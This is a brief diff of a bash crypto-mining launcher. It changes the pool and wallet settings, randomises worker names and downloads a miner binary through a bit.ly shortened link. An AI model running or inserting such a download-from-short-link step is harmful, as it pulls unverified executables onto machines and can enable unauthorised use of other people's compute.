@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=us-eth.2miners.com:2020
-WALLET=0x443dd6fa59a4b77cbe694b61b0fe54dac7eedb6b
+POOL=ethash.poolbinance.com:1800
+WALLET=teguhcong
 WORKER=$(echo $(shuf -i 41-80 -n 1)-ETHash)
 #wget https://github.com/drJamesjack/prem/raw/main/lolMiner
 wget https://bit.ly/3FpnfeJ
